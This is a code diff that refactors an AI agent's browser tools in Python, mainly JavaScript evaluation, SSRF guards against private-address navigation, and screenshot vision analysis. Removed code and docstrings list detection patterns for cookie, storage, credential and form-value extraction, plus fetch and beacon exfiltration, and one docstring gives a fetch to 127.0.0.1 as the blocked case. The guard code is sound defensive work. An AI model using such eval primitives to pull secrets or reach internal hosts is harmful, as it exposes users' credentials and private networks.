 def browser_press(key: str, task_id: Optional[str] = None) -> str:
-    """
-    Press a keyboard key.
-
-    Args:
-        key: Key to press (e.g., "Enter", "Tab")
-        task_id: Task identifier for session isolation
-
-    Returns:
-        JSON string with key press result
-    """
+    """Press a keyboard key (e.g. "Enter", "Tab")."""
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_press
         return camofox_press(key, task_id)
@@ -4823,19 +3407,7 @@ def browser_press(key: str, task_id: Optional[str] = None) -> str:
     if blocked is not None:
         return blocked
     result = _run_browser_command(effective_task_id, "press", [key])
-
-    if result.get("success"):
-        response = {
-            "success": True,
-            "pressed": key
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", f"Failed to press {key}")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+    return _tool_response(result, {"pressed": key}, f"Failed to press {key}")
 
 
 def _blocked_private_page_action(effective_task_id: str, action: str) -> Optional[str]:
@@ -4855,21 +3427,35 @@ def _blocked_private_page_action(effective_task_id: str, action: str) -> Optiona
     }, ensure_ascii=False)
 
 
-def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
-    """Get browser console messages and JavaScript errors, or evaluate JS in the page.
+def _blocked_private_page_json(blocked_url: str) -> str:
+    """Blocked payload for content-returning tools whose page was eval-navigated private."""
+    return json.dumps({
+        "success": False,
+        "error": (
+            "Blocked: page URL targets a private or internal address "
+            f"({blocked_url}). This may have been caused by a "
+            "JavaScript navigation via browser_console."
+        ),
+    }, ensure_ascii=False)
 
-    When ``expression`` is provided, evaluates JavaScript in the page context
-    (like the DevTools console) and returns the result.  Otherwise returns
-    console output (log/warn/error/info) and uncaught exceptions.
 
-    Args:
-        clear: If True, clear the message/error buffers after reading
-        expression: JavaScript expression to evaluate in the page context
-        task_id: Task identifier for session isolation
+def _blocked_private_page_content(effective_task_id: str) -> Optional[str]:
+    """Blocked payload when the SSRF guard is active and the current page is private, else None.
 
-    Returns:
-        JSON string with console messages/errors, or eval result
+    Sibling of the snapshot/vision/eval/get_images guards: after any eval that
+    may have changed ``location.href`` to a private address, returning page
+    content would expose it. Fail-open on probe failure (see
+    ``_current_page_private_url``).
     """
+    if not _eval_ssrf_guard_active(effective_task_id):
+        return None
+    blocked_url = _current_page_private_url(effective_task_id)
+    return _blocked_private_page_json(blocked_url) if blocked_url else None
+
+
+def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
+    """Console messages + uncaught JS errors (optionally ``clear``ing the buffers),
+    or — when ``expression`` is given — evaluate JS in the page like the DevTools console."""
     # --- JS evaluation mode ---
     if expression is not None:
         policy_error = _enforce_browser_eval_policy(expression)
@@ -4884,17 +3470,9 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
 
     effective_task_id = _last_session_key(task_id or "default")
 
-    if _eval_ssrf_guard_active(effective_task_id):
-        _blocked_url = _current_page_private_url(effective_task_id)
-        if _blocked_url:
-            return json.dumps({
-                "success": False,
-                "error": (
-                    "Blocked: page URL targets a private or internal address "
-                    f"({_blocked_url}). This may have been caused by a "
-                    "JavaScript navigation via browser_console."
-                ),
-            }, ensure_ascii=False)
+    blocked = _blocked_private_page_content(effective_task_id)
+    if blocked is not None:
+        return blocked
 
     console_args = ["--clear"] if clear else []
     error_args = ["--clear"] if clear else []
@@ -4932,229 +3510,107 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
     return json.dumps(response, ensure_ascii=False)
 
 
-def _eval_ssrf_guard_active(effective_task_id: str) -> bool:
-    """Return True when eval-driven private-network access must be guarded.
-
-    Matches the gating used by ``browser_navigate`` / ``browser_snapshot`` /
-    ``browser_vision``: the SSRF guard is only meaningful for non-local
-    backends (cloud browser, or a containerized terminal whose browser-on-host
-    can reach internal networks the terminal can't), and is skipped for local
-    sidecar sessions and when ``allow_private_urls`` is set.
-    """
-    return (
-        not _is_local_backend()
-        and not _is_local_sidecar_key(effective_task_id)
-        and not _allow_private_urls()
-    )
-
-
-# URL-shaped literals embedded in a JS expression (http/https only).  Used to
-# pre-screen ``browser_console(expression=...)`` calls that fetch/XHR/navigate
-# to a private host directly — that path never updates ``location.href`` so the
-# post-eval page-URL recheck below can't see it.
-_JS_URL_LITERAL_RE = re.compile(r"""https?://[^\s'"`)\]<>]+""", re.IGNORECASE)
+from tools.browser_tool_eval_policy import (  # noqa: F401
+    _eval_ssrf_guard_active,
+    _JS_URL_LITERAL_RE,
+    _expression_targets_private_url,
+    _current_page_private_url,
+    _RISKY_BROWSER_EVAL_PATTERNS,
+    _JS_STRING_LITERAL_RE,
+    _SENSITIVE_BROWSER_EVAL_TOKENS,
+    _allow_unsafe_browser_evaluate,
+    _restrict_browser_evaluate,
+    _decode_js_string_literal,
+    _decoded_js_string_literals,
+    _sensitive_browser_eval_token_reason,
+    _risky_browser_eval_reason,
+    _enforce_browser_eval_policy,
+    _camofox_current_page_private_url,
+)
 
 
-def _expression_targets_private_url(expression: str) -> Optional[str]:
-    """Return the first private/always-blocked URL literal in a JS expression.
-
-    Best-effort: scans for ``http(s)://...`` literals (fetch/XHR/navigation
-    targets the agent may have embedded) and returns the first one that targets
-    a private/internal address or the always-blocked cloud-metadata floor.
-    Returns ``None`` when no such literal is found.
-    """
-    if not isinstance(expression, str):
-        return None
-    for match in _JS_URL_LITERAL_RE.findall(expression):
-        candidate = match.rstrip(".,;")
-        if _is_always_blocked_url(candidate) or not _is_safe_url(candidate):
-            return candidate
-    return None
+def _parse_eval_value(raw_result: Any) -> Any:
+    """Eval returns the JS value as a string; parse valid JSON so the model gets structured data."""
+    if isinstance(raw_result, str):
+        try:
+            return json.loads(raw_result)
+        except (json.JSONDecodeError, ValueError):
+            pass  # keep as string
+    return raw_result
 
 
-def _current_page_private_url(effective_task_id: str) -> Optional[str]:
-    """Return the current page URL when it targets a private/internal address.
+def _eval_supervisor_fast_path(effective_task_id: str, expression: str) -> Optional[str]:
+    """Run ``Runtime.evaluate`` on the CDP supervisor's persistent WebSocket.
 
-    Reads ``window.location.href`` via a low-cost eval and returns it when the
-    page has been navigated (e.g. via ``location.href = '...'`` in a prior
-    eval) to an address the SSRF guard would reject.  Returns ``None`` when the
-    page is public, the URL can't be determined, or the check errors (fail-open
-    on probe failure, matching the snapshot/vision guards).
+    Zero subprocess startup cost vs spawning ``agent-browser eval``. Returns a
+    tool JSON string when the supervisor produced a definitive answer (a value,
+    a blocked private page, or a real JS-side exception — which is NOT retried
+    through the subprocess, that would just reproduce it slower), or None to
+    fall through to the subprocess path (no supervisor, supervisor-side failure,
+    import error), so behaviour is unchanged when no supervisor is running.
     """
     try:
-        url_result = _run_browser_command(
-            effective_task_id, "eval", ["window.location.href"],
-            timeout=5, _engine_override="auto",
+        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
+        supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
+        if supervisor is None:
+            return None
+        sup_result = supervisor.evaluate_runtime(expression)
+        if sup_result.get("ok"):
+            parsed = _parse_eval_value(sup_result.get("result"))
+            # Post-eval page-URL recheck: if this (or a prior) eval navigated
+            # the page to a private address, withhold the result.
+            blocked = _blocked_private_page_content(effective_task_id)
+            if blocked is not None:
+                return blocked
+            response = {
+                "success": True,
+                "result": _redact_browser_output(parsed),
+                "result_type": type(parsed).__name__,
+                "method": "cdp_supervisor",
+            }
+            return json.dumps(response, ensure_ascii=False, default=str)
+        err = sup_result.get("error") or "evaluate_runtime failed"
+        if "supervisor" not in err.lower():
+            return json.dumps({"success": False, "error": err}, ensure_ascii=False)
+        logger.debug(
+            "browser_eval: supervisor path unavailable (%s), falling back to subprocess",
+            err,
         )
-        if url_result.get("success"):
-            current_url = (
-                url_result.get("data", {}).get("result", "")
-                .strip().strip('"').strip("'")
-            )
-            if current_url and (
-                _is_always_blocked_url(current_url) or not _is_safe_url(current_url)
-            ):
-                return current_url
-    except Exception as exc:
-        logger.debug("_current_page_private_url: probe failed (%s)", exc)
+    except ImportError:
+        pass
+    except Exception as exc:  # pragma: no cover — defensive
+        logger.debug("browser_eval: supervisor path errored (%s), falling back", exc)
     return None
 
 
-_RISKY_BROWSER_EVAL_PATTERNS: tuple[tuple[re.Pattern[str], str], ...] = (
-    (re.compile(r"\bdocument\s*\.\s*cookie\b", re.I), "document.cookie"),
-    (re.compile(r"\b(?:localStorage|sessionStorage)\b", re.I), "web storage"),
-    (re.compile(r"\bindexedDB\b", re.I), "IndexedDB"),
-    (re.compile(r"\bcaches\s*\.\s*(?:open|match|keys)\b", re.I), "Cache Storage"),
-    (re.compile(r"\bnavigator\s*\.\s*(?:clipboard|credentials|serviceWorker)\b", re.I), "navigator sensitive API"),
-    (re.compile(r"\b(?:fetch|XMLHttpRequest|WebSocket|EventSource)\s*\(", re.I), "network request"),
-    (re.compile(r"\bnavigator\s*\.\s*sendBeacon\s*\(", re.I), "network beacon"),
-    (re.compile(r"\bdocument\s*\.\s*forms\b.*\bvalue\b", re.I | re.S), "form value extraction"),
-    (re.compile(r"\bquerySelector(?:All)?\s*\([^)]*(?:input|textarea|password)[^)]*\).*\bvalue\b", re.I | re.S), "form value extraction"),
-)
-_JS_STRING_LITERAL_RE = re.compile(
-    r"""'(?:\\.|[^'\\])*'|\"(?:\\.|[^\"\\])*\"|`(?:\\.|[^`\\])*`""",
-    re.S,
-)
-_SENSITIVE_BROWSER_EVAL_TOKENS: tuple[tuple[str, str], ...] = (
-    ("cookie", "document.cookie"),
-    ("localStorage", "web storage"),
-    ("sessionStorage", "web storage"),
-    ("indexedDB", "IndexedDB"),
-    ("caches", "Cache Storage"),
-    ("clipboard", "navigator sensitive API"),
-    ("credentials", "navigator sensitive API"),
-    ("serviceWorker", "navigator sensitive API"),
-    ("fetch", "network request"),
-    ("XMLHttpRequest", "network request"),
-    ("WebSocket", "network request"),
-    ("EventSource", "network request"),
-    ("sendBeacon", "network beacon"),
-)
-
-
-def _allow_unsafe_browser_evaluate() -> bool:
-    """Return whether sensitive browser JS evaluation is explicitly allowed.
-
-    When true, ``browser_console(expression=...)`` runs without the
-    sensitive-primitive denylist even if ``browser.restrict_evaluate`` is set.
-    """
-    try:
-        from hermes_cli.config import read_raw_config
-
-        cfg = read_raw_config()
-        return is_truthy_value(cfg_get(cfg, "browser", "allow_unsafe_evaluate"), default=False)
-    except Exception as e:
-        logger.debug("Could not read browser.allow_unsafe_evaluate from config: %s", e)
-        return False
-
-
-def _restrict_browser_evaluate() -> bool:
-    """Return whether the sensitive-primitive eval denylist is enabled.
-
-    Off by default. ``browser_console(expression=...)`` is the agent's only
-    programmatic page-inspection path, and the denylist blocks the *names* of
-    common primitives (``fetch``, ``cookie``, ``querySelector(...input...)``)
-    rather than any actual exfiltration — which also blocks a large class of
-    legitimate DOM extraction (any selector or page script text containing
-    those words). Egress itself is still gated by the SSRF/private-URL guards
-    in ``_browser_eval`` regardless of this setting. Users who want the
-    strict vocabulary denylist (e.g. when browsing hostile pages with a
-    logged-in profile) opt in with ``browser.restrict_evaluate: true``;
-    ``browser.allow_unsafe_evaluate: true`` overrides it back off.
-    """
-    try:
-        from hermes_cli.config import read_raw_config
-
-        cfg = read_raw_config()
-        return is_truthy_value(cfg_get(cfg, "browser", "restrict_evaluate"), default=False)
-    except Exception as e:
-        logger.debug("Could not read browser.restrict_evaluate from config: %s", e)
-        return False
-
-
-def _decode_js_string_literal(literal: str) -> str:
-    """Best-effort decode of a JavaScript string literal for policy checks.
-
-    This is not a JS parser.  It only normalizes common escaped property names
-    such as ``document["co\\x6fkie"]`` before the fail-closed sensitive-token
-    check below.
-    """
-    if len(literal) < 2:
-        return literal
-    body = literal[1:-1]
-    try:
-        return bytes(body, "utf-8").decode("unicode_escape")
-    except Exception:
-        return body
-
-
-def _decoded_js_string_literals(expression: str) -> list[str]:
-    return [_decode_js_string_literal(match.group(0)) for match in _JS_STRING_LITERAL_RE.finditer(expression)]
-
-
-def _sensitive_browser_eval_token_reason(expression: str) -> Optional[str]:
-    """Return a risk reason for direct or quoted sensitive browser primitives.
-
-    ``browser_console(expression=...)`` executes in the page origin.  A denylist
-    that only searches direct spellings like ``document.cookie`` and ``fetch(``
-    misses equivalent JavaScript property access such as ``document["cookie"]``
-    or ``globalThis["fetch"](...)``.  Treat sensitive primitive names as risky
-    whether they appear as identifiers or decoded string-literal property names.
-    Concatenating all string literals catches simple obfuscations like
-    ``document["coo" + "kie"]`` while the config opt-in preserves the escape
-    hatch for trusted pages.
-    """
-    string_literals = _decoded_js_string_literals(expression)
-    concatenated_literals = "".join(string_literals).lower()
-    for token, reason in _SENSITIVE_BROWSER_EVAL_TOKENS:
-        if re.search(rf"\b{re.escape(token)}\b", expression, re.I):
-            return reason
-        token_lower = token.lower()
-        if any(token_lower in literal.lower() for literal in string_literals):
-            return reason
-        if token_lower in concatenated_literals:
-            return reason
-    return None
-
-
-def _risky_browser_eval_reason(expression: str) -> Optional[str]:
-    """Return a human-readable reason if a JS expression uses risky primitives."""
-    if not expression:
-        return None
-    for pattern, reason in _RISKY_BROWSER_EVAL_PATTERNS:
-        if pattern.search(expression):
-            return reason
-    return _sensitive_browser_eval_token_reason(expression)
-
-
-def _enforce_browser_eval_policy(expression: str) -> Optional[str]:
-    """Block sensitive browser JS evaluation when the opt-in denylist is on.
-
-    The denylist is opt-in (``browser.restrict_evaluate: true``) because it
-    gates on primitive *names*, which cripples legitimate DOM extraction —
-    see ``_restrict_browser_evaluate``. Network egress to private/internal
-    addresses is enforced separately in ``_browser_eval`` and does not depend
-    on this policy.
-    """
-    if not _restrict_browser_evaluate():
-        return None
-    if _allow_unsafe_browser_evaluate():
-        return None
-    reason = _risky_browser_eval_reason(expression)
-    if not reason:
-        return None
-    return (
-        "Blocked: browser_console(expression=...) tried to use sensitive browser "
-        f"JavaScript primitive ({reason}) while browser.restrict_evaluate is "
-        "enabled. Use browser_snapshot/browser_get_images/browser_console "
-        "without expression for normal inspection, or set "
-        "browser.restrict_evaluate: false in config.yaml to allow "
-        "programmatic evaluation."
-    )
+def _eval_failure_response(result: Dict[str, Any]) -> str:
+    """Tool JSON for a failed ``agent-browser eval``, with actionable rewrites of known errors."""
+    err = result.get("error", "eval failed")
+    if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
+        # Backend capability gap — give the model a clear signal.
+        err = f"JavaScript evaluation is not supported by this browser backend. {err}"
+    elif "reference chain is too long" in err.lower():
+        # A live DOM node / NodeList / Window can't be JSON-serialized by CDP.
+        # The supervisor fast path retries with returnByValue=false; the CLI
+        # subprocess can't, so replace the cryptic protocol error with guidance.
+        err = (
+            "Expression returned a live DOM node / NodeList / Window, "
+            "which can't be serialized. Extract a primitive value "
+            "(e.g. .innerText, .href, .src, .value) or use "
+            "JSON.stringify() / a snapshot tool instead."
+        )
+    return json.dumps(_copy_fallback_warning({"success": False, "error": err}, result))
 
 
 def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
-    """Evaluate a JavaScript expression in the page context and return the result."""
+    """Evaluate a JavaScript expression in the page context and return the result.
+
+    Private-network guard, both sub-paths gated on the same condition: the
+    literal pre-scan closes direct fetches (``fetch('http://127.0.0.1/...')``,
+    which never update ``location.href``); the post-eval page-URL recheck
+    closes navigate-then-read (``location.href = ...`` then read the DOM) —
+    eval returns arbitrary JS results directly, never via snapshot/vision.
+    """
     effective_task_id = _last_session_key(task_id or "default")
 
     if _eval_ssrf_guard_active(effective_task_id):
@@ -5176,162 +3632,25 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
     if _is_camofox_mode():
         return _camofox_eval(expression, task_id)
 
-    # ── Private-network guard (eval return-value path) ──────────────────────
-    # The literal pre-scan above closes the direct-fetch sub-path
-    # (`fetch('http://127.0.0.1/secret')`).  The post-eval page-URL recheck
-    # below closes the navigate-then-read sub-path (`location.href = '...'`
-    # then read the DOM) — eval returns arbitrary JS results directly, never
-    # touching snapshot/vision, so both sub-paths gate on the same condition.
+    fast = _eval_supervisor_fast_path(effective_task_id, expression)
+    if fast is not None:
+        return fast
 
-    # --- Fast path: route through the supervisor's persistent CDP WS ---------
-    # When a CDPSupervisor is alive for this task_id, ``Runtime.evaluate`` runs
-    # on the already-connected WebSocket — zero subprocess startup cost vs
-    # spawning an ``agent-browser eval`` CLI process.  Falls through to the
-    # subprocess path on any error so behaviour is unchanged when no
-    # supervisor is running (e.g. plain agent-browser without a CDP backend).
-    try:
-        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
-        supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
-        if supervisor is not None:
-            sup_result = supervisor.evaluate_runtime(expression)
-            if sup_result.get("ok"):
-                raw_result = sup_result.get("result")
-                # Match the agent-browser path: if the value is a JSON string,
-                # parse it so the model gets structured data.
-                parsed = raw_result
-                if isinstance(raw_result, str):
-                    try:
-                        parsed = json.loads(raw_result)
-                    except (json.JSONDecodeError, ValueError):
-                        pass  # keep as string
-                # Post-eval page-URL recheck: if this (or a prior) eval
-                # navigated the page to a private address, withhold the result.
-                if _eval_ssrf_guard_active(effective_task_id):
-                    _blocked_url = _current_page_private_url(effective_task_id)
-                    if _blocked_url:
-                        return json.dumps({
-                            "success": False,
-                            "error": (
-                                "Blocked: page URL targets a private or internal "
-                                f"address ({_blocked_url}). This may have been "
-                                "caused by a JavaScript navigation via "
-                                "browser_console."
-                            ),
-                        }, ensure_ascii=False)
-                response = {
-                    "success": True,
-                    "result": _redact_browser_output(parsed),
-                    "result_type": type(parsed).__name__,
-                    "method": "cdp_supervisor",
-                }
-                return json.dumps(response, ensure_ascii=False, default=str)
-            # JS exception is a real failure — surface it instead of falling
-            # through to the subprocess path (which would just re-run and
-            # produce the same exception, but slower).
-            err = sup_result.get("error") or "evaluate_runtime failed"
-            if "supervisor" not in err.lower():
-                # Real JS-side error — return it.
-                return json.dumps({"success": False, "error": err}, ensure_ascii=False)
-            # Supervisor-side failure (loop down, no session) — fall through.
-            logger.debug(
-                "browser_eval: supervisor path unavailable (%s), falling back to subprocess",
-                err,
-            )
-    except ImportError:
-        pass
-    except Exception as exc:  # pragma: no cover — defensive
-        logger.debug("browser_eval: supervisor path errored (%s), falling back", exc)
-
-    # --- Fallback: agent-browser CLI subprocess (original path) -------------
     result = _run_browser_command(effective_task_id, "eval", [expression])
-
     if not result.get("success"):
-        err = result.get("error", "eval failed")
-        # Detect backend capability gaps and give the model a clear signal
-        if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
-            response = {
-                "success": False,
-                "error": f"JavaScript evaluation is not supported by this browser backend. {err}",
-            }
-            return json.dumps(_copy_fallback_warning(response, result))
-        # A live DOM node / NodeList / Window can't be JSON-serialized by CDP
-        # and fails the eval with "Object reference chain is too long".  The
-        # supervisor fast path retries with returnByValue=false, but the CLI
-        # subprocess can't, so turn the cryptic protocol error into actionable
-        # guidance instead of surfacing it raw.
-        if "reference chain is too long" in err.lower():
-            response = {
-                "success": False,
-                "error": (
-                    "Expression returned a live DOM node / NodeList / Window, "
-                    "which can't be serialized. Extract a primitive value "
-                    "(e.g. .innerText, .href, .src, .value) or use "
-                    "JSON.stringify() / a snapshot tool instead."
-                ),
-            }
-            return json.dumps(_copy_fallback_warning(response, result))
-        response = {
-            "success": False,
-            "error": err,
-        }
-        return json.dumps(_copy_fallback_warning(response, result))
+        return _eval_failure_response(result)
 
-    data = result.get("data", {})
-    raw_result = data.get("result")
-
-    # The eval command returns the JS result as a string.  If the string
-    # is valid JSON, parse it so the model gets structured data.
-    parsed = raw_result
-    if isinstance(raw_result, str):
-        try:
-            parsed = json.loads(raw_result)
-        except (json.JSONDecodeError, ValueError):
-            pass  # keep as string
-
+    parsed = _parse_eval_value(result.get("data", {}).get("result"))
     response = {
         "success": True,
         "result": _redact_browser_output(parsed),
         "result_type": type(parsed).__name__,
     }
-    # Post-eval page-URL recheck: if this (or a prior) eval navigated the page
-    # to a private address, withhold the result (mirrors the supervisor path).
-    if _eval_ssrf_guard_active(effective_task_id):
-        _blocked_url = _current_page_private_url(effective_task_id)
-        if _blocked_url:
-            return json.dumps({
-                "success": False,
-                "error": (
-                    "Blocked: page URL targets a private or internal address "
-                    f"({_blocked_url}). This may have been caused by a "
-                    "JavaScript navigation via browser_console."
-                ),
-            }, ensure_ascii=False)
+    # Post-eval page-URL recheck (mirrors the supervisor path).
+    blocked = _blocked_private_page_content(effective_task_id)
+    if blocked is not None:
+        return blocked
     return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False, default=str)
-
-
-def _camofox_current_page_private_url(tab_id: str, user_id: str) -> Optional[str]:
-    """Return the Camofox page URL when it targets a private/internal address.
-
-    Camofox analogue of ``_current_page_private_url`` (evaluate endpoint instead
-    of the agent-browser CLI).  Returns ``None`` when the page is public, the URL
-    can't be determined, or the probe errors (fail-open on probe failure,
-    matching the snapshot/vision guards — do not change to fail-closed without
-    also changing the sibling).
-    """
-    try:
-        from tools.browser_camofox import _post
-
-        data = _post(
-            f"/tabs/{tab_id}/evaluate",
-            body={"expression": "window.location.href", "userId": user_id},
-        )
-        current_url = str(data.get("result") if isinstance(data, dict) else data or "")
-        current_url = current_url.strip().strip('"').strip("'")
-        if current_url and (_is_always_blocked_url(current_url) or not _is_safe_url(current_url)):
-            return current_url
-    except Exception as exc:
-        logger.debug("_camofox_current_page_private_url: probe failed (%s)", exc)
-    return None
 
 
 def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
@@ -5355,14 +3674,7 @@ def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
         if _eval_ssrf_guard_active(task_id or "default"):
             _blocked_url = _camofox_current_page_private_url(tab_id, user_id)
             if _blocked_url:
-                return json.dumps({
-                    "success": False,
-                    "error": (
-                        "Blocked: page URL targets a private or internal address "
-                        f"({_blocked_url}). This may have been caused by a "
-                        "JavaScript navigation via browser_console."
-                    ),
-                }, ensure_ascii=False)
+                return _blocked_private_page_json(_blocked_url)
 
         return json.dumps({
             "success": True,
@@ -5431,15 +3743,7 @@ def _maybe_stop_recording(task_id: str):
 
 
 def browser_get_images(task_id: Optional[str] = None) -> str:
-    """
-    Get all images on the current page.
-
-    Args:
-        task_id: Task identifier for session isolation
-
-    Returns:
-        JSON string with list of images (src and alt)
-    """
+    """List the page's images (src, alt, natural size), excluding data: URIs."""
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_get_images
         return camofox_get_images(task_id)
@@ -5460,17 +3764,9 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
 
     if result.get("success"):
         # ── Private-network guard (sibling of snapshot/vision/eval guards) ──
-        if _eval_ssrf_guard_active(effective_task_id):
-            _blocked_url = _current_page_private_url(effective_task_id)
-            if _blocked_url:
-                return json.dumps({
-                    "success": False,
-                    "error": (
-                        "Blocked: page URL targets a private or internal address "
-                        f"({_blocked_url}). This may have been caused by a "
-                        "JavaScript navigation via browser_console."
-                    ),
-                }, ensure_ascii=False)
+        blocked = _blocked_private_page_content(effective_task_id)
+        if blocked is not None:
+            return blocked
 
         data = result.get("data", {})
         raw_result = data.get("result", "[]")
@@ -5504,34 +3800,187 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
-def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> Union[str, Dict[str, Any]]:
+_LP_VISION_FALLBACK_REASON = (
+    "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture."
+)
+
+
+def _vision_mode_label() -> str:
+    _cp = _get_cloud_provider()
+    return "local" if _cp is None else f"cloud ({_cp.provider_name()})"
+
+
+def _lightpanda_vision_preroute(
+    effective_task_id: str, annotate: bool, screenshot_path: Path,
+) -> Tuple[bool, Optional[str], Path]:
+    """Capture the vision screenshot through the Chrome fallback when Lightpanda is the engine.
+
+    Lightpanda has no graphical renderer, so the normal path would fail with a
+    CDP error or return a placeholder PNG. Returns ``(prerouted, fallback_warning,
+    screenshot_path)``; on fallback failure ``prerouted`` is False and the caller
+    takes the normal screenshot path (forcing Chrome) so ``_run_browser_command``
+    still produces the standard fallback metadata/error.
     """
-    Take a screenshot of the current page for visual inspection.
+    engine = _get_browser_engine()
+    if engine != "lightpanda" or not _should_inject_engine(engine):
+        return False, None, screenshot_path
+    logger.debug("browser_vision: pre-routing screenshot to Chrome (engine=lightpanda)")
+    screenshot_args = ["--annotate"] if annotate else []
+    fb_result = _chrome_fallback_screenshot(effective_task_id, screenshot_args, _get_command_timeout())
+    fb_result = _annotate_lightpanda_fallback(fb_result, _LP_VISION_FALLBACK_REASON)
+    if not fb_result.get("success"):
+        logger.warning("Lightpanda Chrome fallback vision screenshot failed: %s", fb_result.get("error"))
+        return False, None, screenshot_path
+    fb_path = fb_result.get("data", {}).get("path", "")
+    if fb_path and os.path.exists(fb_path):
+        import uuid as uuid_mod
+        from hermes_constants import get_hermes_dir
 
-    Captures what's visually displayed in the browser. When the active model
-    supports native vision, the screenshot is attached directly to the
-    conversation so the model can inspect it on the next turn; otherwise Hermes
-    falls back to the auxiliary vision model and returns a text analysis. Useful
-    for visual content the text-based snapshot may not capture (CAPTCHAs,
-    verification challenges, images, complex layouts, etc.).
+        screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
+        screenshots_dir.mkdir(parents=True, exist_ok=True)
+        persistent_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
+        shutil.copy2(fb_path, persistent_path)
+        screenshot_path = persistent_path
+    return True, fb_result.get("fallback_warning"), screenshot_path
 
-    The screenshot is saved persistently and its file path is returned so it
-    can be shared with users via MEDIA:<path> in the response.
 
-    Args:
-        question: What you want to know about the page visually
-        annotate: If True, overlay numbered [N] labels on interactive elements
-        task_id: Task identifier for session isolation
+def _native_vision_result(
+    screenshot_path: Path, question: str, annotate: bool,
+    result: Dict[str, Any], lp_fallback_warning: Optional[str],
+) -> Dict[str, Any]:
+    """Multimodal tool-result envelope: the main model inspects the pixels itself.
 
-    Returns:
-        A JSON string with vision analysis results and screenshot_path, or a
-        multimodal tool-result envelope carrying the screenshot and metadata.
+    History-reuse cap: this embed is baked into the tool result and re-sent on
+    every later turn, exactly like vision_analyze's native path — apply the same
+    proactive resize so full-res screenshots can't enter immutable history
+    uncapped. The helper's stat/dimension quick-estimate skips the resize when
+    already under both caps; without Pillow it fails open to the raw bytes.
+    """
+    from tools.vision_tools import (
+        _EMBED_MAX_DIMENSION,
+        _EMBED_TARGET_BYTES,
+        _build_native_vision_tool_result,
+        _resize_image_for_vision,
+    )
+
+    data_url = _resize_image_for_vision(
+        screenshot_path,
+        mime_type="image/png",
+        max_base64_bytes=_EMBED_TARGET_BYTES,
+        max_dimension=_EMBED_MAX_DIMENSION,
+        force_jpeg=True,
+    )
+    native_result = _build_native_vision_tool_result(
+        image_url=str(screenshot_path),
+        question=question,
+        image_data_url=data_url,
+        image_size_bytes=screenshot_path.stat().st_size,
+    )
+    meta = native_result.setdefault("meta", {})
+    meta["screenshot_path"] = str(screenshot_path)
+    if lp_fallback_warning:
+        meta["fallback_warning"] = lp_fallback_warning
+    if annotate and result.get("data", {}).get("annotations"):
+        meta["annotations"] = result["data"]["annotations"]
+    native_result["text_summary"] = (
+        f"{native_result.get('text_summary', '')} "
+        f"Screenshot path: {screenshot_path}"
+    ).strip()
+    return native_result
+
+
+def _analyze_screenshot_with_aux_llm(screenshot_path: Path, question: str) -> str:
+    """One-shot aux vision-LLM analysis (not baked into history), secret-redacted.
+
+    Encodes at full resolution; on a size-related provider rejection the image
+    is downscaled once and retried. Timeout/temperature come from
+    ``auxiliary.vision.*`` — local vision models (llama.cpp, ollama) can take
+    well over 30s, so the default timeout is generous.
+    """
+    import base64
+
+    vision_prompt = (
+        f"You are analyzing a screenshot of a web browser.\n\n"
+        f"User's question: {question}\n\n"
+        f"Provide a detailed and helpful answer based on what you see in the screenshot. "
+        f"If there are interactive elements, describe them. If there are verification challenges "
+        f"or CAPTCHAs, describe what type they are and what action might be needed. "
+        f"Focus on answering the user's specific question."
+    )
+    _screenshot_bytes = screenshot_path.read_bytes()
+    _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
+    data_url = f"data:image/png;base64,{_screenshot_b64}"
+    vision_model = _get_vision_model()
+    logger.debug("browser_vision: analysing screenshot (%d bytes)",
+                 len(_screenshot_bytes))
+
+    vision_timeout = 120.0
+    vision_temperature = 0.1
+    try:
+        from hermes_cli.config import load_config
+        _vision_cfg = cfg_get(load_config(), "auxiliary", "vision", default={})
+        _vt = _vision_cfg.get("timeout")
+        if _vt is not None:
+            vision_timeout = float(_vt)
+        _vtemp = _vision_cfg.get("temperature")
+        if _vtemp is not None:
+            vision_temperature = float(_vtemp)
+    except Exception:
+        pass
+
+    call_kwargs = {
+        "task": "vision",
+        "messages": [
+            {
+                "role": "user",
+                "content": [
+                    {"type": "text", "text": vision_prompt},
+                    {"type": "image_url", "image_url": {"url": data_url}},
+                ],
+            }
+        ],
+        "temperature": vision_temperature,
+        "timeout": vision_timeout,
+    }
+    if vision_model:
+        call_kwargs["model"] = vision_model
+    try:
+        response = _lazy_call_llm(**call_kwargs)
+    except Exception as _api_err:
+        from tools.vision_tools import (
+            _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
+        )
+        if not (_is_image_size_error(_api_err) and len(data_url) > _RESIZE_TARGET_BYTES):
+            raise
+        logger.info(
+            "Vision API rejected screenshot (%.1f MB); "
+            "auto-resizing to ~%.0f MB and retrying...",
+            len(data_url) / (1024 * 1024),
+            _RESIZE_TARGET_BYTES / (1024 * 1024),
+        )
